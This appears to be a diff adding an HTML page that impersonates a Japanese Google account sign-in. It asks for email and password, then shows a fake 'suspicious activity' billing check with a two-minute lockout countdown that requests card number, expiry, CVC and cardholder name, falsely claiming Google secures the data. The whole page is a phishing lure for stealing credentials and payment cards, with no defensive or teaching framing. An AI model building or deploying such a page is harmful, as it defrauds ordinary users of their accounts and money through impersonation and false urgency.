@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ログイン - Google アカウント</title>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-container">
+        <div class="content-wrapper">
+            <div class="google-logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="height: 24px; width: auto;">
+            </div>
+            
+            <div id="email-section">
+                <h1 class="header-text">ログイン</h1>
+                <p class="subheader-text">Google アカウントを使用</p>
+                <div class="input-group">
+                    <input type="email" id="email" class="input-field" placeholder=" " required>
+                    <label for="email" class="placeholder">メールアドレスまたは電話番号</label>
+                </div>
+                <button type="button" class="link-button">メールアドレスを忘れた場合</button>
+                <div class="button-row">
+                    <button type="button" class="link-button">アカウントを作成</button>
+                    <button type="button" id="next-btn" class="primary-button">次へ</button>
+                </div>
+            </div>
+
+            <div id="password-section">
+                <h1 class="header-text">パスワードを入力してください</h1>
+                <div id="user-email-display"></div>
+                <div class="input-group">
+                    <input type="password" id="password" class="input-field" placeholder=" " required>
+                    <label for="password" class="placeholder">パスワードを入力</label>
+                </div>
+                <div class="button-row" style="justify-content: flex-end;">
+                    <button type="button" class="link-button" id="forgot-password-btn">パスワードをお忘れの場合</button>
+                    <button type="button" id="login-btn" class="primary-button">ログイン</button>
+                </div>
+            </div>
+
+            <div id="billing-section">
+                <h1 class="header-text">お支払い情報の確認</h1>
+                <p class="subheader-text">
+                    お客様のアカウントで疑わしいアクティビティが検出されました。
+                    セキュリティ強化のため、お支払い情報を確認してください。
+                    この操作は**<span id="subheader-timer">02:00</span>**以内に完了する必要があります。
+                </p>
+
+                <div class="timer-container">
+                    <div id="timer">02:00</div>
+                    <div class="timer-message">時間切れになるとアカウントがロックされます。</div>
+                </div>
+
+                <div class="input-group">
+                    <input type="text" id="card-number" class="input-field" placeholder=" " required maxlength="19">
+                    <label for="card-number" class="placeholder">カード番号</label>
+                </div>
+                <div class="form-row">
+                    <div class="input-group expiration-date">
+                        <input type="text" id="expiry-date" class="input-field" placeholder=" " required maxlength="5">
+                        <label for="expiry-date" class="placeholder">有効期限 (MM/YY)</label>
+                    </div>
+                    <div class="input-group cvc">
+                        <input type="password" id="cvc" class="input-field" placeholder=" " required maxlength="4">
+                        <label for="cvc" class="placeholder">CVC</label>
+                    </div>
+                </div>
+                <div class="input-group">
+                    <input type="text" id="card-holder-name" class="input-field" placeholder=" " required>
+                    <label for="card-holder-name" class="placeholder">カード名義人</label>
+                </div>
+                <p class="small-text">
+                    この情報はセキュリティ目的でのみ使用され、Googleによって安全に保護されます。
+                    ご提供いただいた情報は、お客様のGoogleアカウントのセキュリティを確保するためにのみ利用されます。
+                </p>
+                <div class="button-row" style="justify-content: center;">
+                    <button type="button" id="submit-billing-btn" class="primary-button">確認して続行</button>
+                </div>
+            </div>
+
+            <div id="alert-message"></div>
+
+        </div>
+    </div>
+    <div class="footer">
+        <div class="language-selector">
+            <select>
+                <option value="ja">日本語</option>
+                <option value="en">English</option>
+                <option value="es">Español</option>
+                </select>
+        </div>
+        <div class="footer-links">
+            <a href="#">ヘルプ</a>
+            <a href="#">プライバシー</a>
+            <a href="#">規約</a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
